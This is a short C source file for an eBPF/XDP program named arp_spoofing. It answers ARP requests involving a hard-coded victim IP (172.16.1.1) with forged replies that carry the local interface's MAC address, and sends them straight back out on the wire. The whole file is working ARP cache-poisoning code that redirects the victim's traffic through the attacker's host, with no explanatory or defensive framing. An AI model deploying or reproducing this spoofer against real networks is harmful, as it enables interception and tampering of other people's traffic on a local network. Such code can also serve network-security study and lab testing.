#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include <linux/if_arp.h>

char LICENSE[] SEC("license") = "Dual MIT/GPL";

__u8 victim_ip[4] = {172,16,1,1};
struct ether_arp {
	struct arphdr ea_hdr;
	__u8 arp_sha[6];
	__u8 arp_spa[4];
	__u8 arp_tha[6];
	__u8 arp_tpa[4];
};

SEC("xdp")
int arp_spoofing(struct xdp_md *ctx) {
	void *data_end = (void*)(long)ctx->data_end;
	void *data = (void*)(long)ctx->data;

	struct ethhdr *eth = data;
	if((void*)(eth + 1) > data_end)
		return XDP_PASS;
	
	if(bpf_ntohs(eth->h_proto) != ETH_P_ARP)
		return XDP_PASS;

	struct ether_arp * eth_arp  = (void*)(eth + 1);
	
	if((void*)(eth_arp + 1) > data_end)
		return XDP_PASS;

	if(eth_arp->ea_hdr.ar_op == bpf_htons(ARPOP_REQUEST) && (!__builtin_memcmp(eth_arp->arp_tpa, victim_ip, 4) || !__builtin_memcmp(eth_arp->arp_spa, victim_ip, 4))) {
		struct bpf_fib_lookup fib_para = {0};
		__builtin_memcpy(eth->h_dest, eth->h_source, 6);
		__builtin_memcpy(eth_arp->arp_tha, eth->h_source, 6);
		fib_para.family = AF_INET;
		fib_para.ifindex = ctx->ingress_ifindex;
		if (bpf_fib_lookup(ctx, &fib_para, sizeof(fib_para), BPF_FIB_LOOKUP_DIRECT | BPF_FIB_LOOKUP_SRC) == BPF_FIB_LKUP_RET_SUCCESS) {
			__builtin_memcpy(eth->h_source, fib_para.smac, 6);
			__builtin_memcpy(eth_arp->arp_sha, fib_para.smac, 6); 
		}
		__u8 tmp_tpa[4] = {0};
		__builtin_memcpy(tmp_tpa, eth_arp->arp_tpa, 4);
		__builtin_memcpy(eth_arp->arp_tpa, eth_arp->arp_spa, 4);
		__builtin_memcpy(eth_arp->arp_spa, tmp_tpa, 4);
		eth_arp->ea_hdr.ar_op = bpf_htons(ARPOP_REPLY);
		return XDP_TX;
	}
	return XDP_PASS;
}

